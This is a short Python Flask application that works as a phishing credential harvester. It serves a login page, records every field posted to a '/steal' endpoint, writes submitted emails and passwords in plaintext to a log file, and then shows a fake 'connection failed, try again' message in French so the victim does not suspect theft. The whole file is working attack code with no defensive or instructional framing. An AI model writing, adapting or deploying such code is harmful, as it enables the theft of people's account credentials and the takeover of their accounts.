from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def login_page():
    return render_template('login.html')

@app.route('/steal', methods=['POST'])
def steal():
    data = request.form.to_dict()
    with open("log.txt", "a") as f:
        for key, value in data.items():
            f.write(f"{key}: {value}\n")
    return '', 204

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    with open("logs.txt", "a") as f:
        f.write(f"[LOGIN] Email: {email}, Password: {password}\n")
    return "Connexion échouée. Réessayez."  # Simule un mauvais mot de passe

if __name__ == '__main__':
    app.run(port=8000)
